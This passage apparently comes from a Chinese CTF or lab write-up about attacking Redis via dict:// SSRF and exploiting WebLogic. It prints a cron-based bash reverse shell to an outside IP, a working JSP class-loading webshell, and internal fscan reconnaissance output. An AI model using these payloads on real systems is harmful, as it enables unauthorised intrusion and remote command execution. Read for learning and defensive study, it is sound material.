class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Asave</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151308098.png"
+	width="1682"
+	height="764"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151308098_hu_927acbba2704ef10.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115151308098_hu_500e2c39795f3c6e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115151308098"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="528px"
+	
+></p>
+<p>但是一直没弹上？然后我又url编码一次打还是不行，换下面打法，成功!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">dict</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">flushall</span>
+</span></span><span class="line"><span class="cl"><span class="n">dict</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">config</span> <span class="n">set</span> <span class="n">dir</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span>
+</span></span><span class="line"><span class="cl"><span class="n">dict</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">config</span> <span class="n">set</span> <span class="n">dbfilename</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">dict</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">set</span> <span class="n">x</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/101.200.39.193/5000 0&gt;&amp;1</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">dict</span><span class="p">:</span><span class="o">//</span><span class="mf">172.18</span><span class="o">.</span><span class="mf">240.7</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">save</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116193433700.png"
+	width="697"
+	height="200"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116193433700_hu_5c5d28507687bf3a.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251116193433700_hu_38cc3e73e5f4098d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251116193433700"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="348"
+		data-flex-basis="836px"
+	
+></p>
+<p><a class="link" href="https://github.com/xmsec/redis-ssrf"  target="_blank" rel="noopener"
+    >GitHub - xmsec/redis-ssrf: redis ssrf gopher generater &amp; redis ssrf to rce by master-slave-sync</a></p>
+<p>本来这个方法，但是不行&hellip;&hellip;</p>
+<h2 id="web1-2">web1-2
+</h2><h3 id="考点-dict-协议连接到-redis-服务">考点： DICT 协议连接到 Redis 服务
+</h3><p>通过 DICT 协议连接到 Redis 服务，拿flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dict://172.18.240.7:6379/keys *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dict://172.18.240.7:6379/get:flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115114635279.png"
+	width="1218"
+	height="390"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115114635279_hu_1bf477207e3047c0.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115114635279_hu_44c2360b0ba1b11.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115114635279"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="749px"
+	
+></p>
+<h2 id="web2-1">web2-1
+</h2><h3 id="考点weblogic-cve">考点：weblogic-cve
+</h3><p>[<a class="link" href="https://blog.csdn.net/sky8001/article/details/105484805"  target="_blank" rel="noopener"
+    >记错]访问项目报错Error 404&ndash;Not Found | From RFC 2068 Hypertext Transfer Protocol-CSDN博客</a></p>
+<p>访问/console得到</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114192939744.png"
+	width="1891"
+	height="605"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114192939744_hu_d054014444e2361a.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114192939744_hu_258bd393bb80c4f3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114192939744"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="750px"
+	
+></p>
+<p>直接搜weblogic漏洞</p>
+<p><a class="link" href="https://blog.csdn.net/qq_43512091/article/details/126879053"  target="_blank" rel="noopener"
+    >记一次weblogic-10.3.6.0靶场漏洞利用_weblogic10.3.6版本漏洞-CSDN博客</a></p>
+<p><a class="link" href="https://cloud.tencent.com/developer/article/1861375"  target="_blank" rel="noopener"
+    >干货 | 最全的Weblogic漏洞复现-腾讯云开发者社区-腾讯云</a></p>
+<p>看第一篇得到一个工具，直接拿flag</p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114194240692.png"
+	width="838"
+	height="166"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114194240692_hu_9b0d34cc0ed55bf9.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114194240692_hu_d08e1c979432425b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114194240692"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="504"
+		data-flex-basis="1211px"
+	
+></p>
+<p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114195104569.png"
+	width="671"
+	height="203"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114195104569_hu_86f7999130b82d44.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251114195104569_hu_4b04d3370477305a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114195104569"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="793px"
+	
+></p>
+<h2 id="web2-2">web2-2
+</h2><h3 id="考点weblogic的cve_2016_0638_echo漏洞解weblogic的密文得数据库密码">考点：weblogic的CVE_2016_0638_ECHO漏洞+解weblogic的密文得数据库密码
+</h3><p>接下来参考此文</p>
+<p><a class="link" href="https://wanth3f1ag.top/2025/03/23/weblogic%e6%bc%8f%e6%b4%9e%e9%9d%b6%e5%9c%ba%e5%a4%8d%e7%8e%b0/"  target="_blank" rel="noopener"
+    >记一次weblogic-10.3.6.0靶场漏洞利用</a></p>
+<p>删掉端口后面多余字符，输入/uddiexplorer/</p>
+<p>随便在右上角找了一个图片的路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://119.45.164.136:7001/uddiexplorer/help.gif
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>复制图片文件名 到weblogic中用命令去查找</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find ./ -name help.gif
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115104904141.png"
+	width="934"
+	height="294"
+	srcset="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115104904141_hu_ef8ecbbe7c7e20a0.png 480w, /p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/image-20251115104904141_hu_28ecf3239ea953b3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251115104904141"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="762px"
+	
+></p>
+<p>然后我们pwd看一下当前的目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/root/Oracle/Middleware/user_projects/domains/base_domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后拼接一下路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个路径就是我们可以上传文件的路径</p>
+<p>然后上传shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">U</span> <span class="k">extends</span> <span class="n">ClassLoader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">U</span><span class="p">(</span><span class="n">ClassLoader</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">super</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">Class</span> <span class="n">g</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">super</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">b</span><span class="o">.</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">base64Decode</span><span class="p">(</span><span class="ne">String</span> <span class="nb">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">clazz</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decodeBuffer&#34;</span><span class="p">,</span> <span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">clazz</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(),</span> <span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.util.Base64&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;getDecoder&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decode&#34;</span><span class="p">,</span> <span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;passwd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cls</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new</span> <span class="n">U</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">())</span><span class="o">.</span><span class="n">g</span><span class="p">(</span><span class="n">base64Decode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">pageContext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251115105611199.png" alt="image-20251115105611199" style="zoom:50%;" />
+<p>蚁剑连</p>
+<img src="image-20251115105555989.png" alt="image-20251115105555989" style="zoom:50%;" />
+<p>上传fscan，并附权限，ifconfig看ip</p>
+<img src="image-20251115105843723.png" alt="image-20251115105843723" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./fscan -h 172.16.10.0/24,172.25.20.0/24,172.26.30.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LiveTop</span> <span class="mf">172.25.20.0</span><span class="o">/</span><span class="mi">24</span>   <span class="n">段存活数量为</span><span class="p">:</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LiveTop</span> <span class="mf">172.16.10.0</span><span class="o">/</span><span class="mi">24</span>   <span class="n">段存活数量为</span><span class="p">:</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">LiveTop</span> <span class="mf">172.26.30.0</span><span class="o">/</span><span class="mi">24</span>   <span class="n">段存活数量为</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">7001</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.25.20.10</span><span class="p">:</span><span class="mi">7001</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">7001</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">6379</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">6379</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.25.20.12</span><span class="p">:</span><span class="mi">3306</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">22</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.25.20.1</span><span class="p">:</span><span class="mi">22</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">22</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8082</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8081</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8081</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">80</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">80</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8082</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8848</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8848</span> <span class="nb">open</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span>        <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1925</span>   <span class="n">title</span><span class="p">:</span><span class="n">Hello</span><span class="err">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span>        <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1925</span>   <span class="n">title</span><span class="p">:</span><span class="n">Hello</span><span class="err">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8081</span>   <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">11217</span>  <span class="n">title</span><span class="p">:</span><span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="mf">11.0.14</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8848</span>   <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">431</span>    <span class="n">title</span><span class="p">:</span><span class="n">HTTP</span> <span class="n">Status</span> <span class="mi">404</span> <span class="err">–</span> <span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8848</span>   <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">431</span>    <span class="n">title</span><span class="p">:</span><span class="n">HTTP</span> <span class="n">Status</span> <span class="mi">404</span> <span class="err">–</span> <span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8081</span>   <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">11217</span>  <span class="n">title</span><span class="p">:</span><span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="mf">11.0.14</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8082</span>   <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">15928</span>  <span class="n">title</span><span class="p">:</span><span class="n">BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站</span><span class="err">�</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8082</span>   <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">15928</span>  <span class="n">title</span><span class="p">:</span><span class="n">BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站</span><span class="err">�</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8848</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">alibaba</span><span class="o">-</span><span class="n">nacos</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8848</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">alibaba</span><span class="o">-</span><span class="n">nacos</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.1</span><span class="p">:</span><span class="mi">8848</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">alibaba</span><span class="o">-</span><span class="n">nacos</span><span class="o">-</span><span class="n">v1</span><span class="o">-</span><span class="n">auth</span><span class="o">-</span><span class="n">bypass</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">PocScan</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.26.30.1</span><span class="p">:</span><span class="mi">8848</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">alibaba</span><span class="o">-</span><span class="n">nacos</span><span class="o">-</span><span class="n">v1</span><span class="o">-</span><span class="n">auth</span><span class="o">-</span><span class="n">bypass</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16.10.8</span><span class="p">:</span><span class="mi">7001</span>   <span class="n">code</span><span class="p">:</span><span class="mi">404</span> <span class="nb">len</span><span class="p">:</span><span class="mi">1164</span>   <span class="n">title</span><span class="p">:</span><span class="n">Error</span> <span class="mi">404</span><span class="o">--</span><span class="n">Not</span> <span class="n">Found</span>
